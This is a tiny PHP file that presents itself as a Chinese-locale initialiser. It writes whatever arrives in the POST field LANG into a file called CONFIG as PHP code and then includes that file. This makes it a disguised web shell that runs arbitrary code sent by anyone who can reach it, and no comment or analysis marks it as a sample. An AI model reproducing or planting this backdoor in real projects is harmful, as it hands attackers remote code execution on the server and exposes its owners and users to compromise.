<?php
$s="echo 'init ZH_CN success!'";
$res=isset($_POST["LANG"])?$_POST["LANG"]:$s;
file_put_contents("CONFIG","<?php ".$res." ?>");
include "CONFIG";
?>
